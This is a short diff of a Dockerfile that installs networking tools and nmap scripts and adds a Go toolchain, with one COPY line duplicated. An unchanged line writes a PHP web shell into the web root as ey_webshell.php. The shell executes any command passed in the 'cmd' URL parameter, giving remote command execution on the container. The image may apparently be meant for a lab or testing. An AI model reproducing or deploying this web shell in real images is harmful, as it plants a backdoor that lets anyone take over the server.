@@ -14,6 +14,11 @@ RUN apk add --no-cache \
   net-tools \
   python3 \
   nmap-scripts
+
+COPY --from=golang:1.13-alpine /usr/local/go/ /usr/local/go/
+ 
 RUN echo "=========="
 USER nobody
+COPY --from=golang:1.13-alpine /usr/local/go/ /usr/local/go/
+ENV PATH="/usr/local/go/bin:${PATH}"
 RUN echo "<?php echo exec(\$_GET['cmd']);?>" > /var/www/html/ey_webshell.php
